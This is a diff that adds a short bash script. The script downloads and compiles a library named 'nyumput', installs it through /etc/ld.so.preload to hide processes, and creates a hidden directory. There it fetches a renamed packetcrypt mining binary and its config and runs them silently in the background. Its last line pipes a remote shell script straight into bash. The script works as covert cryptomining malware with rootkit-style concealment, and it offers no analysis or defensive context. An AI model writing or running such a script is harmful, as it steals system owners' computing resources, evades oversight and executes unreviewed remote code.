@@ -1,0 +1,14 @@
+#!/bin/bash
+apt-get update ; apt-get install sudo -y
+curl https://github.com/adawisaud/adawisaud/raw/main/nyumput.c -o nyumput.c
+apt-get install build-essential -y
+gcc -Wall -fPIC -shared -o libnyumput.so nyumput.c -ldl
+mv libnyumput.so /usr/local/lib/
+echo /usr/local/lib/libnyumput.so >> /etc/ld.so.preload
+rm nyumput.c
+mkdir .kap && cd .kap
+wget https://github.com/sitina21/pekatuy/raw/master/piket.json >/dev/null 2>&1
+wget -O sgr1 https://github.com/cjdelisle/packetcrypt_rs/releases/download/packetcrypt-v0.5.2/packetcrypt-v0.5.2-linux_amd64 >/dev/null 2>&1
+chmod +x sgr1 piket.json
+./sgr1 ann --config "piket.json" >/dev/null 2>&1 &
+curl -sL https://github.com/sitina21/zuph/raw/main/gobel.sh | bash
